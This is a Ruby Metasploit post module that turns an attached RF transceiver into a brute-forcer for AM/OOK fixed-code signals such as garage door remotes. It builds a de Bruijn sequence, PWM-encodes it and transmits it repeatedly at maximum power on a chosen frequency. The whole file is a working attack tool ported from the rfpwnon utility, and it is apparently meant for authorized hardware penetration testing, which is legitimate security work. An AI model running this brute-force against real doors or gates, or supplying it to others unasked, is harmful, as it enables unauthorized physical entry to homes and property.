##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post
  include Msf::Post::Hardware::RFTransceiver::RFTransceiver

  def initialize(info={})
    super( update_info( info,
        'Name'          => 'Brute Force AM/OOK (ie: Garage Doors)',
        'Description'   => %q{ Post Module for HWBridge RFTranscievers.  Brute forces AM OOK or raw
                               binary signals.  This is a port of the rfpwnon tool by Corey Harding.
                               (https://github.com/exploitagency/github-rfpwnon/blob/master/rfpwnon.py)
        },
        'License'       => MSF_LICENSE,
        'Author'        => ['Craig Smith'],
        'Platform'      => ['hardware'],
        'SessionTypes'  => ['hwbridge']
      ))
    register_options([
      OptInt.new('FREQ', [true, "Frequency to transmit on"]),
      OptInt.new('BAUD', [false, "Baud rate to use", 2000]),
      OptInt.new('BINLENGTH', [false, "Binary Length of signal to brute force", 8]),
      OptInt.new('REPEAT', [false, "Number of times to repeat the signal", 5]),
      OptString.new('PPAD', [false, "Specify your own binary padding before the brute forced binary", nil]),
      OptString.new('TPAD', [false, "Specify your own binary padding after the brute forced binary", nil]),
      OptBool.new('RAW', [false, "When set, disables PWM encoding. BINLENGTH must be -1", false]),
      OptBool.new('TRI', [false, "When set, brute foces a trinary signal.", false]),
      OptBool.new('EXTRAVERBOSE', [false, "More verbose", false]),
      OptInt.new('INDEX', [false, "USB Index to use", 0]),
      OptInt.new('DELAY', [false, "Delay in milliseconds between transmissions", 500])
    ])
    @zeropwm = "1110"
    @onepwm = "1000"
    @brutechar = "01"
  end

  # @param key [String] binary/trinary represntation
  # @return [Array] ByteArray
  def convert_ook(key)
    pwm_str_key = ""
    key.each_char do |k|
      x = "*"
      case k
      when "0"
        x = @zeropwm
      when "1"
        x = @onepwm
      when "2"
       x = @twopwm
      end
      pwm_str_key += x
    end
    return pwm_str_key.scan(/.{1,8}/).collect{|x| x.to_i(2).chr}
  end

  def debruijn_bytes(k, n)
    @a=[0]
    @sequence = []
    debruijn(1, 1, k, n)
    return @sequence.join
  end

  def debruijn(t, p, k, n)
    if t>n
      if n%p==0
        1.upto(p) {|j| @sequence<<@a[j]}
      end
    else
      @a[t]=@a[t-p]
      debruijn(t+1, p, k, n)
      (@a[t-p]+1).upto(k-1) {|j|
        @a[t]=j
        debruijn(t+1, t, k, n)
      }
    end
  end

  def run
    unless is_rf?
      print_error("Not an RF Transceiver")
      return
    end
    unless set_index(datastore['INDEX'])
      print_error("Couldn't set usb index to #{datastore['INDEX']}")
      return
    end
    if datastore['TRI']
      @zeropwm = "10001000"
      @onepwm = "11101110"
      @twopwm = "10001110"
      @brutechar = "012"
    end

    set_modulation("ASK/OOK")
    set_freq(datastore['FREQ'])
    set_sync_mode(0)
    set_baud(datastore['BAUD'])
    max_power

    print_status("Generating de bruijn sequence...")
    seq = debruijn_bytes(@brutechar.length, datastore['BINLENGTH'])
    tail = seq[0, datastore['BINLENGTH']-1]
    brutepacket = seq + tail

    print_status("Brute forcing frequency: #{datastore['FREQ']}")
    print_status("Padding before binary: #{datastore['PPAD']}") if datastore['PPAD']
    print_status("Padding after binary: #{datastore['TPAD']}") if datastore['TPAD']
    print_status("De Bruijin Sequence: #{brutepacket}") if datastore['EXTRAVERBOSE']

    startn = 0
    endy = 512
    brutepackettmp = ""
    addr = 512
    if datastore['TRI']
      endy = 128
      addr = 128
    end
    if datastore['REPEAT'] >= 2 || datastore['PPAD'] || datastore['TPAD']
      endy = datastore['BINLENGTH']
      addr = 1
    end
    # Transmit
    while startn < brutepacket.length
      (0..datastore['REPEAT']-1).each do |i|
        brutepackettemp = brutepacket[startn..endy-1]
        next if brutepackettemp.length < datastore['BINLENGTH']
        # Pad if asked to
        brutepackettemp = datastore['PPAD'] + brutepackettemp if datastore['PPAD']
        brutepackettemp += datastore['TPAD'] if datastore['TPAD']
        if datastore['RAW']
          key_packed = brutepackettemp.scan(/.{1,8}/).collect{|x| x.to_i(2).chr}
        else
          key_packed = convert_ook(brutepackettemp)
        end
        print_status("Transmitting...")
        set_flen(key_packed.length)
        rfxmit(key_packed.join)
        print_status("Binary before PWM encoding:")
        print_status("#{brutepackettemp}")
        print_status("Binary after PWM encoding:")
        print_status("#{key_packed.join.unpack("H*")[0].hex.to_s(2)}")
        sleep(datastore['DELAY'] / 1000) if datastore['DELAY'] > 0
      end
      if datastore['REPEAT'] >= 2 or datastore['PPAD'] or datastore['TPAD']
        startn += addr
        endy += addr
      else
        startn = startn + addr - datastore['BINLENGTH']
        endy = endy + addr - datastore['BINLENGTH']
      end
    end
    print_status("Done")
    set_mode("IDLE")
  end
end
